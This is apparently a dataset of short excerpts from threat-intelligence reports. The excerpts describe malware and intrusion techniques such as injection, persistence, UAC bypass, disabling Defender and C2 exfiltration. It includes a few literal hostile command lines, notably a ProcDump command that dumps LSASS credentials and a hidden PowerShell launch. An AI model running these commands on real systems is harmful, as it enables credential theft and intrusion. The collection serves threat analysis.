the NtTerminateProcess and ExitProcess functions
CreateFileW API.
API function
various WinAPI functions.
low-level API functions (such as NtEnumerateValueKey or NtQuerySystemInformation)
NtTestAlert function
call the NtTestAlert function
NtTestAlert function
CreateProcessInternalW API function
 NtQueueAPCThread function
KiUserExceptionDispatcher function
WinAPI file manipulation functions.
calling API functions from this library
hooks the kernel’s PsCreateSystemThread function
launches a slightly modified Metasploit Reverse HTTPS stager
connects to a configured C2 server using HTTPS for communication.
Makes an initial POST request to the C2 server
to the C2 server via a POST request.
All communications between the server are encrypted with RC4
encrypted with RC4
A snippet of the RC4 key generation function
Returns the list of network adapter types, IP and MAC addresses assigned to them.
Returns names of shortcuts in the Desktop directory.
Returns the path to the ‘Program Files’ folder.
Returns the short form of the user’s profile folder
Returns the user’s profile folder
Returns the list of object names in the \GLOBAL?? directory.
Retrieve the list of files
gets the list of recent files
search, delete files.
file listings
Create file listing recordings
Returns the path to the user’s temporary folder.
Returns the current domain SID
Returns the current user’s name
Returns the current user’s SID.
WMI query
Creates a scheduled task that runs at system startup
The Task Scheduler launches it at system startup
scheduled task properties
a DLL obfuscated with VMProtect.
unpacking the Orchestrator
unpacks it with aPLib.
Orchestrator is unpacked
The Orchestrator (as well as plugins) are packed with aPLib and encrypted with AES.
unpacks with aPLib
encrypted with XOR and compressed with aPLib.
unpacks it with aPLib
takes a screenshot
screenshots
screen
take screenshots during, online conversations.
Capture the screen area around mouse click locations
Take screenshots with a specified frame rate, and livestream or record them.
screenshots
Commands are used to download and install plugins
Commands are used to download and run the Trojan Installer.
Upload, download
downloading and executing specific utilities
downloads Security Shellcodes from the C2 server
may save recording files in the working directory
stored in the working directory
the malware’s working directory
Once the working directory is prepared,
keylogs
keystrokes
record keystrokes
Delete a recording with a given filename from the system.
Uninstall the backdoor.
wipes all the files and registry keys created by the backdoor
delete files.
creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.
APC injections
The asynchronous procedure places a hook on the NtTestAlert function and then exits
will be loaded with the help of the APC injection loader.
the hooked process creation function clears a possible hook of the  NtQueueAPCThread function and then uses it to create an APC procedure in the new process.
junk code created by the ProcessWorm loader
entries point to buffers of randomly generated junk code
method names contain junk.
The executable is prepended with 0x4000 random bytes and encrypted with RC4
documents sent to the printer.
Steal files which are printed by the victim
recently opened documents
Uninstall a plugin from the machine
Sets up persistence by creating an entry in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key.
adds it to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key
Bash script
launched on every startup by rundll32.exe
creates a thread in the kernel that injects the next stage into winlogon.exe.
A thread with trampoline shellcode is created inside exe.
The victim downloads a Trojanized application and executes it.
we identified numerous legitimate applications backdoored
TeamViewer
Cleans  API functions potentially hooked by security solutions
attackers also exploited vulnerabilities such as PrintNightmare to escalate privileges
Software vulnerabilities, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), may be exploited in an attempt to elevate privileges.
has operated sites on the Tor network using the following .onion
this key is typically obfuscated with AES 256 encryption.
encrypted PowerShell.
Upon execution, the ransomware binary deletes itself
Creating the HKCU\Software\Zeppelin registry key
by modifying the Registry.
valid credentials have been used by Vice Society to gain initial access.
Internet-facing applications and systems vulnerabilities can be exploited, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), to gain initial access.
Batch files are used
features multiple flags that could be set as command line arguments
Persistence is maintained after boot/reboot via malicious autostart registry keys.
utilizes legitimate programs to side-load the group’s own DLL to execute their payload.
Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection.
execute commands via scheduled tasks/jobs.
Files dropped in the victim’s environment by Vice Society may have been altered to appear legitimate.
attempts to disable Windows Defender
Attempts to disable or modify endpoint security, such as Microsoft Defender, on compromised devices.
utilizes comsvcs.dll to dump credentials from Local Security Authority Subsystem Service.
RDP is used by the group for lateral movement.
Lateral tool transfers have been used to move tools and files from one compromised system to another, including SMB and RDP.
to exfiltrate data to external C2 servers.
to exfiltrate data directly to C2 servers.
Tools such as SystemBC and proprietary backdoors are known to be used
Legitimate processes have been corrupted by Vice Society via code injection, as a means to evade defenses.
malware is designed to steal sensitive information from victims' systems,
attackers used an innocent-looking email to lure victims into opening an attachment.
we found the original email that included a ZIP file attached, which contained an ISO file.
sample uses obfuscation
This file is an obfuscated .NET file
only uses one code obfuscation technique: API hashing.
Payload
Obfuscation
each data byte in the HTTP based C2 communication,
submitted to the C2 server through HTTP protocol using the POST method.
the HTTP C2 Communication section.
HTTP C2 Communication
to the C2 through the HTTP protocol.
can be found in the two bytes of the HTTP payload
shows a HTTP POST request and its corresponding message body.
the Content-Key, which is a custom HTTP header whose value corresponds to a hash generated out of the HTTP header.
HTTP POST request (type 27 / data exfiltration).
then uploads this information to an attacker-controlled machine via HTTP POST.
exfiltrates information to the C2 through the HTTP protocol.
HTTP POST request (type 27 / data exfiltration).
an ISO file opener that mounts and opens the file with a simple double-click.
To the victim, the opening process simply looks like a regular directory.
obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code.
process hollowing was used to inject a malicious PE file into the legitimate process called aspnet_compiler.exe.
use this technique to retrieve export functions from loaded libraries
the corresponding APIs in the appropriate library.
via the MoveFileExW or CopyFileW Windows API.
Then, it creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
In order to establish persistence on the targeted host, the malware starts by saving a copy of itself in a new folder in the %APPDATA% directory
searches for and exfiltrates the following information:
OS architecture
Built-in admin
Domain host name
Hostname
Local admin
Operating system
Screen resolution
Username information
Exfiltrate keylogger data
Keylogger database
can use additional payload types
Exfiltrate screenshots
Potential hidden files
It collects sensitive data from web browsers,
These functions are made to steal credentials from different types of applications and services on the Windows operating system:
Browsers: Safari, Internet Explorer, Firefox and Chromium-based browsers
adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications.
their initial exploitation of vulnerable internet-facing applications,
continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices
After gaining initial access to an organization by exploiting a vulnerability with a public POC,
as several adversaries are exploiting CVE-2022-47966 for initial access.
Apache Log4j2 (aka Log4Shell)
enable RDP connections.
can use the Active Directory database to access credentials for users’ accounts.
credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users,
The actors could also gain access to other systems where individuals may have reused their passwords.
to persist in target environments and deploy additional tools.
backdoor with the ability to download and run additional tools
create scheduled tasks for persistence.
Scheduled Task Creation or
Remote Task Creation/Update using Schtasks Process
the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest.
can read files,
gather information on an infected host, and send details back to the attackers.
Commands executed by WMI on new hosts
script to deobfuscate the control flow of shellcode
Malware immediately decrypts the third layer
it decrypts the c2 URL
Use NtQueryInformationProcess API
It decrypts an encrypted payload,
Payload decryption function.
the payload decryption key
deobfuscated code of GuLoader’s shellcode.
using stack to decrypt strings
script to restore deobfuscate control flow.
control flow obfuscation
encrypted shellcode’s file
encrypted payload from c2.
obfuscated arithmetic value calculations
an encrypted payload
shellcode control flow obfuscation
control flow obfuscation.
Unpacking of GuLoader’s shellcodes.
packed using NSIS installer.
UNPACKING GULOADER’S SHELLCODE
It then calls CallWindowProcW API.
Uses EnumWindows API
Uses EnumDeviceDrivers and GetDeviceDriverBaseNameA APIs.
Uses MsiEnumProductsA and MsiGetProductInfoA APIs.
Uses OpenSCManagerA and EnumServicesStatusA APIs.
Uses NtSetInformationThread API
DbgBreakPoint and DbgUiRemoteBreakin API
it starts payload execution using the ZwCreateThreadEx API.
call RtlAddVectoredExceptionHandler API
This shellcode has complex obfuscation, consisting of junk code
dynamic API resolution
use process hollowing to inject decrypted payload into child process and resolves its Import Address Table.
DLL sideloading,
program first sideloads u2ec.dll, which then loads the payload file usb.ini
malware rzlog4cpp.dll is sideloaded
which is used for the first sideloading.
including the use of DLL sideloading
Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.
First-stage legitimate executable for DLL sideloading
Second-stage legitimate executable for DLL sideloading
files have XOR-encrypted content to prevent detection
contains another payload that is XOR-encrypted
applies obfuscation techniques
 reads the encrypted configuration filecan
an encrypted configuration.
the logging strings are encrypted with a single byte in XOR operations as
and obfuscation mechanisms.
an increasing number of obfuscations are being adopted to thwart static analysis.
containing one-byte XOR encrypted sections
will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.
after decrypting the frData member in
The decryption function
It will then decrypt the encrypted payload with the predefined RC4 key
After decryption, it then checks if the first byte of the decrypted payload
The decrypted payload
After this is decrypted,
The malware will continue to read and decrypt goopdate
C&amp;C traffic of the PUBLOAD HTTP variant
it communicates to its C&amp;C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices
malware that communicates over the MQTT protocol.
Command codes in the PUBLOAD HTTP variant
HTTP variant
HTTP variant
The data in the HTTP body is the same as the past variant,
HTTP variant
supports data upload
the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server
PowerShell downloading malware
The certutil.exe program downloads the WinRAR binary
the threat actors used PowerShell to download multiple malware and archives from the server
command execution.
its shell open command.
create a reverse shell.
It will then create a reverse shell via ncat.exe to the server
backdoor that is capable of executing commands
including adding more command-line arguments
also supports command-line arguments,
we discovered several tools used for UAC bypass in Windows 10.
HackTool.Win32.ABPASS is a tool used to bypass UAC in Windows 10.
HackTool.Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass
This service has the highest privileges that can be abused for Windows 10 UAC bypass.
UAC bypass will be executed via the AppInfo RPC service.
UAC Bypass via the CMSTPLUA COM interface
UAC Bypass via the AppInfo RPC service
UAC bypass will be executed
UAC bypass is executed via token manipulation.
UAC bypass is executed
net user &lt;username&gt;
and the following data is written into registry:
Registry keys changed
It creates a new Shell in the registry.
it installs itself to %programdata% and then sets the registry run key for persistence.
It invokes the undocumented API UserAssocSet to update the file association.
strings and the APIs used by
It installs itself by creating an InstallSvc service
creating aservice called InstallSvc
Creates a service
which is injected to conduct backdoor behaviors.
and inject it into winver.exe for the next-stage payload
It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).
Delete file
Delete file
Keystrokes and windows monitoring
Monitor keystrokes and windows
Keylogging
will check if the running processes
will check if the process avp.exe exists.
It sets up a run key for via the command C:\ProgramData\GoogleUpdate\googleupdate.exe work for persistence.
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence.
Sets Run Key with “work/online”
It installs itself by creating aservice called InstallSvc which will trigger “C:\programdata\netsky\netsky.exe online”.
malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.
Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string
is another example of custom malware used for packing files;
Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email.
Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email.
that had the remote desktop service enabled.
and the creation of a schedule task.
conceal its true code through either encryption or compression
make the malicious payload smaller and avoid detection based on static malware analysis techniques
UPX is an open-source packing algorithm
MPRESS is a free packer.
Andromeda is a custom packer
compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.
entry point of the original file is relocated, and so is the Import Address Table (IAT).
change the final payload’s section names,
have very few imports as they don’t rely on external libraries
allocate memory, change permissions, read the encrypted/packed chunk of code, decrypt it, load it to the allocated memory space and execute it
use system calls
VirtualAlloc used for allocating memory in the current process
VirtualProtect changes the permissions of the given virtual address.
RtlDecompressBuffer decompresses the provided buffer.
CreateProcessInternalW creates a new process.
can create a new threat with the malicious unpacked payload.
initial code usually called a stub, decrypts or decompresses the real code
stub is a small part of code that implements the decompression (and decryption) of the originally packed file
the payload of the malware can be part of the loader’s file
strongly indicates that it contains another component that is dropped/loaded.
it can be downloaded from a remote location (by the loader, also known as a Downloader).
use system calls
VirtualAlloc used for allocating memory in the current process
VirtualProtect changes the permissions of the given virtual address
RtlDecompressBuffer decompresses the provided buffer.
CreateProcessInternalW creates a new process
not see them in the imported function list, and they not even be part of the strings in the sample.
try to hide these system calls
function and the corresponding library are dynamically loaded at runtime – also known as explicit linking
this executable then downloads and executes additional payloads
This executable binary insecurely downloads and executes additional payloads from the Internet.
Downloading and running further executables
It downloads and runs an executable payload
This is a Windows Native Binary executable embedded inside of UEFI firmware binary
This Windows executable is embedded into UEFI firmware
the embedded Windows executable
an embedded executable
This executable uses the Windows Native API
It then sets registry entries
to run this executable as a Windows Service.
when using the HTTPS-enabled options
implants made their native Windows executables look like legitimate update tools.
the Windows payload was named “IntelUpdater.exe”
Capturing screenshots
Real-time screen monitoring
a legitimate tool which is frequently used by bad actors for malicious purposes in ways similar to TeamViewer
NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.
As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work ‘out of the box’.
has been observed in multiple ISO files masquerading as legitimate software,
The RAT installation is disguised to look similar to a Google Chrome installation.
RAT installer disguised as Google Chrome setup
threat actors are able to masquerade the dropper or installer
The sample is obfuscated via the Babadeda crypter.
a base64 encoded string is used to specify various parameters
Base64 encoded RAT execution command
Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.
Persistence via Scheduled Task
In addition, the sample generates a scheduled task with multiple triggers.
Network adapter details are pulled via GetAdaptersAddresses
Additional data is gleaned via WMI queries
SELECT * FROM Win32_ComputerSystem
all running processes are enumerated and logged via EnumProcesses (32-bit processes).
has the ability to drop and execute additional components.
These files are all self-deleted after launch
threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software.
decoded command
Downloads the miner and watcher.
then a malware downloader is uploaded to the device
Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning.
its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.
This method speeds up the brute forcing process
“intelligent brute forcing”
then determines the processor architecture
Is able to steal/gather information on CPU type, screen resolution
The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).
via the shell “echo” commands.
keystroke
download a malicious file
executes a malicious script
JavaScript is the module that has to be manually executed by the victim,
zip archive
comes with an embedded PE payload
PE is stored as a Base64 encoded string
stored as a list of registry keys, yet we also observed a variant in which similar content was written into a TXT file.
obfuscated Powershell script that runs another Base64 obfuscated layer that finally decodes the .NET payload.
embedded inside as a base64 encoded buffer
In its resources we can find another PE
been obfuscated in order to hide its real intentions
Base64 encoded string, and in the other as a hexadecimal string
PE file was encoded as an obfuscated hexadecimal string.
Base64 encoded script
Base64
obfuscated by XOR
three layers where one decodes content for the next
decodes the next element:
deobfuscates and runs another block of code
deobfuscate it.
decodes it
deobfuscate the file
decoding
decoding
Decoded content
Decoded content
deobfuscates
was decoded
decoding the base64-encoded content,
decompressed
reading/writing registry keys
written to the registry, as a list of keys.
JavaScript fetched from the C2 server
downloaded code chunk
GET request with C2 server
Process Hollowing – one of the classic methods of PE injection
PE injection, manual loading into the parent process
fetches IcedID from a remote resource
Malicious OneNote attachment
The “Forked” version of the malware loader first appeared in February 2023, distributed directly through thousands of personalized invoice-themed phishing emails.
These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file
string-decryption code
sending basic host info to the C2
took place over an unencrypted HTTP channel, the network traffic was plainly visible.
When the user double clicks or opens the lnk file,
lures the user to open a document.lnk file which will execute the malicious DLL loader
The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks
starts a hidden file in the directory
then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).
From these injected processes,
the different processes they injected into
a process where Cobalt Strike was injected into
The process injection technique was used multiple times to inject into different processes
Almost every post-exploitation job was launched from an injected process.
a process where the threat actors injected:
where they were previously injected into
Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account
previously injected into
Process injections in svchost process via CreateRemoteThread, Default named pipes, etc
processes which threat actors injected into:
After injecting into various processes on the host,
various injections across hosts
injected into multiple processes on different hosts.
the threat actors began discovery tasks using Windows utilities
These batch scripts’ purposes
then two batch scripts were dropped and run.
using the following command line:


C:\Windows\System32\cmd.exe /c
C:\Windows\system32\cmd.exe /C powershell.exe -nop -w hidden -c
launching the getsystem command in the wrong console (shell console rather than the beacon console).
C:\Windows\system32\cmd.exe /C getsystem
cmd.exe /C
C :\Windows\system32\cmd.exe /C shell
Threat actors used two scripts named s.bat (for servers) and w.bat
bat script:
bat script:
using Windows utilities like ping and tasklist.
tasklist
tasklist was also used in order to enumerate processes on multiple hosts remotely
process list
the threat actor started their first lateral movement using RDP
they accessed the server via RDP
Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:
the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.
the first lateral movement from the beachhead to the server using RDP with an Administrator account:
and again on a server with Administrator privileges.
using the Administrator account each time
to execute Procdump, which was used to dump lsass.
they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.
dumping their LSASS process
LSASS Dump
Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique
C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp
Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS,
Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.
Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:
The threat actors also transferred ProcDump from the beachhead to multiple workstations:
This first lateral movement was performed in order to drop and install AnyDesk.
threat actors remotely dropped AnyDesk binary on a server from the beachhead:
used PowerShell to download and execute
which downloaded obfuscated PowerShell and executed it in memory:
just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon
dropping and the execution of several payloads using multiple techniques
threat actors used CS as the main Command and Control tool, dropped several payloads,
the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.
C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob
Sysmon File Created event showing wab.exe created by rundll32.exe
cmd.exe /C rundll32.exe
C:\Windows\System32\rundll32.exe
Because rundll32.exe executed PowerShell, we can see that rundll32.exe created
were initiated from the rundll32.exe process
The random (PsExec) service runs a rundll32.exe process without any arguments.
The metadata included TA machine’s hostname,
systeminfo
wmic product get name,version
“Display information about current Windows version
MAC address
ipconfig /all
showing wab.exe executed by WMI
wmic /node
wmic
obfuscated PowerShell
Once deobfuscated,
its installation as a service was used in order to persist and create a backdoor to the network.
the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.
a remote service was created with random alphanumeric characters, service name and service file name
Below is an example of the service edc603a that was created
A new service was created
Threat actors obtained and abused credentials of privilege domain accounts
A service account, with Domain Administration permissions, was used to create a remote service on a Domain Controller to move laterally.
the service account logged into one of the Domain Controllers from the beachhead.
We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.
ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:
Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:
whoami
C :\Windows\system32\cmd.exe /C shell whoami /all
the win32 function CreateServiceA was used by the malware
The account used to perform this lateral movement
Threat actors executed this tool on patient 0 with low-level privileges multiple times
The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.
they accessed the server via Anydesk.
AnyDesk and its installation as a service was used
AnyDesk logs, %ProgramData%\AnyDesk\ad_svc.trace and %AppData%\AnyDesk\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion
The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.
Threat actors also created a remote thread in svchost.exe
Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:
the service account password was weak and cracked offline by threat actors.
Named pipes were created in order to establish communication between CS processes
Named piped are commonly used by Cobalt Strike perform various techniques.
used CMD-based scripts
CMD-based scripts
CMD-based scripts
gets executed via the “SHELLEXECUTE”.
The first .CMD file set seen to use AutoIt in its execution
Each email has an HTML attachment.
The email text employs scare tactics, such as evidence of a traffic violation, prompting the user to open the HTML attachment
prompting the user to open the HTML attachment
contains some junk code and data in HEX format.
The data blob in HEX decodes
slightly obfuscated URL address
two base64 encoded data blobs and code instructions for its execution.
base64 data block execution
The first base64 data blob
All data is then sent back to the attacker's C2
the attacker's C2 via the HTTP POST method.
The C2 is constructed with the victim's enumerated data
extract sensitive information,
operating system version
OS architecture (x86 or x64)
keyboard layout
Opening the attached “multa_de_transito_502323.html” file triggers the embedded JavaScript
download a “.VBS” file
It proceeds by downloading the “sqlite3.dll” file
to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys
exploiting vulnerable web-facing devices
exfiltrate proprietary or confidential information,
decrypting a shellcode
starts by decrypting its initial configuration data
It starts its code by decrypting its initial configuration
the code of the decryption algorithm used by RedLine Stealer to decrypt its initial configuration data
Once the initial configuration data has been decrypted
to decrypt the password stored
Once the master key is decrypted,
to decrypt it using AES GCM algorithm
The decrypted password
Try to disable Windows Defender service “WinDefend”
Try to disable Tamper Protection settings of Windows Defender
Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender.
Disable Windows update services such as (“wuauserv”, “WaaSMedicSvc”, “UsoSvc”)
Disable Automatic Update and change Windows configurations related to Windows Update 
which is often encoded or encrypted to prevent detection
combination of Base64 and XOR functions.
The master key is encoded with Base64 and encrypted
to grab the encoded and encrypted master key
it will parse the AES IV (Initialization vector) and the encrypted password
to steal information from the compromised or targeted host
has the ability to collect or extract various types of system information from a targeted or compromised computer
func_GetHostSerialNumber()
host serial number
Retrieves  system default language, timezone and OS version
Get processor information of the compromised host by executing "SELECT * FROM Win32_Processor"
func_GetProcessor()
func_GetLanguageTimeZoneOsVersion()
func_GetGraphicCards
Get AdapterRAM and Graphic Card Name and type by executing  "root\\CIMV2", "SELECT * FROM Win32_VideoController"
func_GetTotalRAM()
Get the total RAM size of compromised host by executing "SELECT * FROM Win32_OperatingSystem" and look for "TotalVisibleMemorySize"
Retrieve the user domain name, username
Get the user name of the compromised host
func_GetUserName()
Parse firewall and Anti Virus Product install in the compromised host by running
"SELECT * FROM ROOT\\SecurityCenter2"
"SELECT * FROM ROOT\\SecurityCenter"
"SELECT * FROM AntivirusProduct"
"SELECT * FROM FirewallProduct"
"SELECT * FROM AntiSpyWareProduct"
func_GetFirewalls()
func_ListProcesses()
Retrieve process list and process information by running 'SELECT * FROM Win32_Process'
Screen Capture
func_ScanScreen() is the one responsible for this screen capture capability
has a functionality to capture a screenshot of the targeted or compromised host as part of its data collection and exfiltration
uses .NET Graphics class CopyFromScreen Function() to transfer a bit block of color data from the screen to the Graphic drawing surface that will be saved in memory stream for data exfiltration.
Parse all installed application in the compromised host by querying 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall' registry
Parse browser application and browser version installed in the compromised host by querying "SOFTWARE\WOW6432Node\Clients\StartMenuInternet" or "SOFTWARE\Clients\StartMenuInternet" registry
uses .NET Graphics class CopyFromScreen Function()
using Windows CryptProtectData() API.
cracking browser sensitive information like passwords
The decrypted password will be sent to its C2 Server as part of its data exfiltration.
it enumerates several known Crypto Wallet directories and looks for files related to crypto currencies by looking for files having “wallet” substring on its file name.
used a compiled remote desktop malware,
then executed RDPEnable on the infected machine.
There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system
It enumerates files and directories
File enumeration
using FindFirstFileW, FindNextFileW, and FindClose APIs
For each directory it traverses
using FindFirstFileW, FindNextFileW, and FindClose APIs
installing remote access software.
actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.
by listing accessible local IPs
It checks for the number of processors in the infected system
Checking the number of processors
This is a multi-stage attack that involves sideloading DLLs,
involves sideloading DLLs along
icon files with encrypted data appended to the end of the files.
These encrypted strings,
once decrypted, contained the C2 domains for additional malicious artifacts.
attempt to obtain system information
the malware attempts to retrieve additional malicious artifacts
Inject and execute DLLs
Manipulate processes (list
Manipulate files and directories (list
Manipulate files and directories (list, download, upload, view, delete
download, upload
Take screenshots
Execute commands via Command Prompt
executed using ShellExecute with the following command line:
This type of threats is usually delivered as email attachments.
Encoded binary payload
Encrypted and compressed payload
Start of encrypted and compressed loader configuration and payload
an encoded payload split across several nodes, further complicating its extraction.
That node contains the encoded payload.
the encoded payload
To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64
Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.
the resulting bytes are further decoded with xor 82.
The decoded payload
Once the payload is decoded
After decrypting and decompressing the payload
Decrypted and decompressed payload
Decodes sensitive memory regions in the current process with the same XOR key
it locates a packed and compressed payload
Injection type: Current process (1) or in the new process
Process to inject into
 Process to inject into
this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode.
The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection.
To launch the shellcode, the loader calls ZwCreateThreadEx to create a new suspended injection thread hidden from debuggers using the THREAD_CREATE_FLAGS_CREATE_SUSPENDED (0x01) and THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4) thread creation flags.
by redirecting calls to the Windows Sleep API to its own function
communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests
shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR.
the execution of the downloaded DLL via the tool rundll32.exe.
performs the download of a file
PowerShell script that downloads and executes a dropper
downloads a payload
malware dynamically calls the API NtAllocateVirtualMemory
AES Cryptographic Provider from WinCrypt APIs
the API Web RESTful that provides access to Microsoft Cloud service resources.
using the Microsoft Graph API
uses the Microsoft Graph API
decrypted using the RSA
The malware proceeds to de-obfuscate strings using a XOR loop
de-obfuscated strings:
decrypted through an AES-256-CBCdecryption algorithm
decrypted
the decrypted content
The code in the injected PE
injects in itself a new PE (Portable Executable) file,
passes the execution to the region of memory in which the copied PE is allocated
the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.
the full HTTP request to make the first connection to the C&amp;C
enumerating the child files in the check OneDrive subdirectory.
The execution triggers the setting of the following registry key
triggered when the user starts the presentation mode and moves the mouse
triggered when the user starts the presentation mode and moves the mouse
A new file, again with a JPEG extension
Contents of the .img file, including the hidden files
hiding the rest of its files from the user.
to run the subsequent BAT scripts
the attacker’s BAT file to run
The BAT script
a BAT file (4.2) to be run on logon as another UI shell
executes another BAT script
Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe
UAC bypass implementation
If it fails, it sets in the registry
Register a new service
a new service that will run its VBS script (4.1) using sc.exe.
the malicious executable to unpack itself.
which is unpacked only when run with a unique password, allow evading traditional signature-based detection.
decrypting and running the ransomware
The user is then prompted to open the single visible shortcut (2) file.
contains obfuscated VBA scripts or a binary with a JPG extension
to trick users into opening the malicious attachments in
If a target opens the malicious attachment,
using three possible types of messages to try to get a target to open the email and malicious attachment.
The attachment, if opened,
spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.
a malicious attachment sent via phishing emails
the malicious attachment,
the email and malicious attachment.
sends emails pretending to be related to a shipment notice for the target which contain a malicious attachment.
Both send information to command and control (C2) servers
keylogging every tap
obtain logs of the infected machine’s keystrokes
exfiltrate data from messaging applications such as WhatsApp and Viber
The malware can deliver payloads from the command and control (C2) server
This vulnerability allows for a threat actor to obtain system privileges
take screenshots
This version of CEIDPageLock has VMProtect, which makes analysis and unpacking difficult
then proceeded to dump credentials from LSASS.
the threat actors again used Get-System to elevate and then dumped LSASS.
Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.
threat actor injected into a dllhost.exe process
which is then injected into svchost and dllhost.
Process injection was observed during the intrusion
direct Cobalt Strike processes and the injected processes
injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.
dumped from an injection into the SearchIndexer process
This was achieved by transferring a Cobalt Strike DLL over SMB
the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.
SMB to transfer DLL's into the ProgramData folder of hosts for purposes of lateral movement.
and executing via a remote service on another workstation.
using a batch file named find.bat.
Windows discovery commands
using a batch script
batch script
basic discovery tasks on the host using built in Windows utilities.
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
via the find.bat batch script.
which was then fed to a batch script
The batch file contained one line,
began enumerating the network using native Windows binaries
via the interactive shell
wrote a registry run key for persistence
used a registry run key to maintain persistence.
systeminfo
systeminfo
C:\Windows\system32\cmd.exe /C systeminfo
ipconfig
ipconfig /all
sending new emails with attached xls and zip files.
The document came in via email in the form of a zip file which included an xls file.
The emails were sent through various compromised email accounts, propagating additional malicious xls files
Using the remote admin tools
the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment
Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.
after a user opened an Excel document and enabled macros.
To deobfuscate the document the tool xlmdeobfuscator was used with the following output.
After deobfuscation
used process hollowing to launch under the context of the Dllhost.exe process
the following URLs are hard coded, and obfuscated
to download the second stage.
malware pulled down and executed a Cobalt Strike payload on
ran another round of discovery activity with native windows utilities
cmd.exe /C
“C:\Windows\System32\cmd.exe” CommandLine: “C:\Windows\system32\cmd.exe /c
cmd.exe /C
C:\Windows\system32\cmd.exe /C gpupdate 
C:\Windows\system32\cmd.exe /C gpupdate 
